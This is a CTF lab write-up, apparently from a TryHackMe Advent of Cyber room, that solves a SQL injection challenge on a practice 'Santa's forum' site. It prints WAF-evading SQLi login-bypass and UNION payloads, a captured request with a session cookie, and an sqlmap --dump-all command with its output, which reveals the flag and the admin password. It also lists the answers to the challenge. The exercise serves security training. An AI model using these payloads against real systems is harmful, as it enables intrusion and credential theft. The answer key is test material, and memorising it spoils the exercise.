After last year's attack, Santa and the security team have worked hard on reviving Santa's personal portal. Hence, 'Santa's forum 2' went live.

After the attack, logs have revealed that someone has found Santa's panel on the website and logged into his account! After doing so, they were able to dump the whole gift list database, getting all the 2020 gifts in their hands. An attacker has threatened to publish a wishlist.txt file, containing all information, but happily, for us, he was caught by the CBI (Christmas Bureau of Investigation) before that. On 10.10.16.88:8000 you'll find the copy of the website and your goal is to replicate the attacker's actions by dumping the gift list!

Visit the vulnerable application in Firefox, find Santa's secret login panel and bypass the login. Use some of the commands and tools covered throughout today's task to answer Questions #3 to #6.

Santa reads some documentation that he wrote when setting up the application, it reads:

Santa's TODO: Look at alternative database systems that are better than sqlite. Also, don't forget that you installed a Web Application Firewall (WAF) after last year's attack. In case you've forgotten the command, you can tell SQLMap to try and bypass the WAF by using

- Without using directory brute forcing, what's Santa's secret login panel?
```
/santapanel
```
```
http://10.10.16.88:8000/santapanel
```
- Visit Santa's secret login panel and bypass the login using SQLi
```
'/**/OR/**/1=1#
```
- How many entries are there in the gift database?
```
22
```
```
a' OR 1=1--+
```
- What did Paul ask for?
```
Github Ownership
```
- What is the flag?
```
thmfox{All_I_Want_for_Christmas_Is_You}
```
- What is admin's password?
```
EhCNSWzzFP6sc7gB
```

```
flag' UNION ALL SELECT  sqlite_version(),2--+

GET /santapanel?search=as HTTP/1.1
Host: 10.10.16.88:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://10.10.16.88:8000/santapanel?search=a%27%2F**%2FUnION%2F**%2FAlL%2F**%2FSELeCT%2F**%2F1%2CUSER%28%29--%2B
Cookie: session=eyJhdXRoIjp0cnVlfQ.X8vu7A.ejgbhp_34dPeRaCpzdDjXSqih64
Upgrade-Insecure-Requests: 1

saving the request as file called dump

sqlmap -r dump --tamper=space2comment --dbms=sqlite --level 5 --dump-all  

[21:07:10] [INFO] table 'SQLite_masterdb.sequels' dumped to CSV file '/root/.sqlmap/output/10.10.16.88/dump/SQLite_masterdb/sequels.csv'
[21:07:10] [INFO] fetching columns for table 'hidden_table' in database 'SQLite_masterdb'                                                                                              
[21:07:10] [INFO] fetching entries for table 'hidden_table' in database 'SQLite_masterdb'                                                                                              
Database: SQLite_masterdb                    
Table: hidden_table                          
[1 entry]                                    
+-----------------------------------------+                                                
| flag                                    |                                                
+-----------------------------------------+                                                
| thmfox{All_I_Want_for_Christmas_Is_You} |                                                
+-----------------------------------------+                                                

[21:07:10] [INFO] table 'SQLite_masterdb.hidden_table' dumped to CSV file '/root/.sqlmap/output/10.10.16.88/dump/SQLite_masterdb/hidden_table.csv'
[21:07:10] [INFO] fetching columns for table 'users' in database 'SQLite_masterdb'                                                                                                     
[21:07:10] [INFO] fetching entries for table 'users' in database 'SQLite_masterdb'                                                                                                     
Database: SQLite_masterdb                    
Table: users                                 
[1 entry]                                    
+----------+------------------+              
| username | password         |              
+----------+------------------+              
| admin    | EhCNSWzzFP6sc7gB |              
+----------+------------------+   
```
